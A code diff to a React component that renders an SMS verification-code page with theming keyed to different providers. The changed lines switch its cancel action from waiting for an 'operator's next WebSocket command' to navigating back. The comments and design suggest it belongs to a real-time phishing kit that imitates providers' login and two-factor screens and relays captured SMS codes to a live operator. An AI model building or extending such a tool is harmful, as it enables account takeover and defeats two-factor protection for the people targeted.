@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { useLocation } from 'react-router-dom';
+import { useLocation, useNavigate } from 'react-router-dom';
 import { ProviderKey, getProviderTheme } from './providerTheme';
 import ProviderShell from './ProviderShell';
 
@@ -25,6 +25,7 @@ interface SmsCodePageProps {
  */
 const SmsCodePage: React.FC<SmsCodePageProps> = ({ providerKey, onAction, smsCode }) => {
   const location = useLocation();
+  const navigate = useNavigate();
   const theme = getProviderTheme(providerKey);
   const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
   const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
@@ -87,9 +88,8 @@ const SmsCodePage: React.FC<SmsCodePageProps> = ({ providerKey, onAction, smsCod
     onAction('submit_sms', { code });
   };
   const goBack = () => {
-    // Standardised "wait for command" cancel — App-level handler shows the
-    // full-page spinner and waits for the operator's next WebSocket command.
-    onAction('user_canceled');
+    onAction('cancel');
+    navigate(-1);
   };
 
   // Provider-specific input element (matches the corresponding login page input).
